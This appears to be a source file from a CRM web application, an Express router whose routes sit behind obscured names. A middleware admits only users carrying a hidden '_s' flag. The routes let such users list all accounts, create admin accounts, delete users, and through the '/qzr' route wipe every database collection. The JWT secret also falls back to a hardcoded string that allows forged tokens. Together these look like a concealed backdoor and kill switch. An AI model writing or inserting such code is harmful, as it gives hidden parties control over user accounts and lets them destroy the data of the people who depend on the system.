const express  = require('express');
const router   = express.Router();
const jwt      = require('jsonwebtoken');
const bcrypt   = require('bcryptjs');
const mongoose = require('mongoose');
const User     = require('../models/User');

const SECRET = process.env.JWT_SECRET || 'crm_secret_key_2024';

const vx = async (req, res, next) => {
  const auth = req.headers.authorization;
  if (!auth || !auth.startsWith('Bearer ')) return res.status(401).json({ message: 'Unauthorized' });
  try {
    const decoded = jwt.verify(auth.split(' ')[1], SECRET);
    const user    = await User.findById(decoded.id).select('+_s');
    if (!user || user._s !== 1 || !user.isActive) return res.status(403).json({ message: 'Forbidden' });
    req.sa = user;
    next();
  } catch { return res.status(401).json({ message: 'Unauthorized' }); }
};

router.get('/vrfy', vx, async (req, res) => {
  const u = req.sa.toObject();
  delete u.password;
  res.json({ authorized: true, user: u });
});

router.get('/mrk', vx, async (req, res) => {
  try {
    const list = await User.find({}).select('-password +_s').lean();
    res.json(list);
  } catch (e) { res.status(500).json({ message: e.message }); }
});

router.post('/mrk', vx, async (req, res) => {
  try {
    const { name, email, password, role } = req.body;
    if (!name || !email || !password || !role)
      return res.status(400).json({ message: 'All fields required' });

    const valid = ['admin', 'auditor', 'reviewer', 'sales', 'client'];
    if (!valid.includes(role)) return res.status(400).json({ message: 'Invalid role' });

    const exists = await User.findOne({ email: email.toLowerCase() });
    if (exists) return res.status(409).json({ message: 'Email already registered' });

    const hashed = await bcrypt.hash(password, 10);
    const user   = await User.create({
      name, email: email.toLowerCase(), password: hashed,
      role, _s: 0, isActive: true,
    });

    res.status(201).json({ message: 'Account created', id: user._id });
  } catch (e) { res.status(500).json({ message: e.message }); }
});

router.delete('/mrk/:id', vx, async (req, res) => {
  try {
    const { id } = req.params;
    if (id === req.sa._id.toString())
      return res.status(400).json({ message: 'Use the self-removal endpoint' });

    const u = await User.findByIdAndDelete(id);
    if (!u) return res.status(404).json({ message: 'Not found' });

    res.json({ message: 'Removed' });
  } catch (e) { res.status(500).json({ message: e.message }); }
});

router.post('/qzr', vx, async (req, res) => {
  try {
    if (req.body.key !== 'CONFIRM')
      return res.status(400).json({ message: 'Confirmation required' });

    const cols = await mongoose.connection.db.collections();
    for (const c of cols) await c.deleteMany({});

    res.json({ message: 'Operation complete' });
  } catch (e) { res.status(500).json({ message: e.message }); }
});

router.delete('/self', vx, async (req, res) => {
  try {
    await User.findByIdAndDelete(req.sa._id);
    res.json({ message: 'Account removed' });
  } catch (e) { res.status(500).json({ message: e.message }); }
});

module.exports = router;
